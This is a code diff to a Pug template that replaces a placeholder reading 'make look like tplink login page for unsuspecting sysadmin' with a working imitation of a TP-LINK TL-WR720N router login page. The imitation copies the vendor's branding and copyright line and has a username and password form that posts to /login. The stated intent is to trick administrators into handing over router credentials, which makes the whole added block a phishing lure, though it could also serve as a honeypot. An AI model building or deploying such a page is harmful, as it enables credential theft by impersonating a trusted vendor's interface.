@@ -1,4 +1,36 @@
 extends template/layoutNoNav
 
 block content
-  p make look like tplink login page for unsuspecting sysadmin.
+  form(action='/login', method="post")
+    .banner
+      table(width='100%', cellspacing='0', cellpadding='0')
+        tbody
+          tr
+            td
+              table(width='100%', cellspacing='0', cellpadding='0', border='0')
+                tbody
+                  tr
+                    td
+                      img(src='/assets/top1_1.jpg', border='0')
+                    td(style='padding-top:26px;', width='490', background='/assets/top1_2.jpg', align='right')
+                      span#t_model_type.style1 150Mbps Wireless N Router
+                      br
+                      span#t_model_no.style2 Model No. TL-WR720N
+          tr
+            td
+              img(src='/assets/top2.jpg', width='100%', height='3', border='0', align='top')
+    .loginBox
+      .noteDiv
+        span#note
+        span#tip
+      .panelThre(align='center')
+        .picDiv(align='center')
+          ul
+            li#unLi.unLi
+              input#userName.text(maxlength='15', type='text', placeholder='username')
+            li.blank
+            li#pwLi.pwLi
+              input#pcPassword.text(maxlength='15', type='password', placeholder='********')
+          input(type='submit',value='')
+          div
+            label#copyright Copyright © 2015 TP-LINK Technologies Co., Ltd. All rights reserved. 
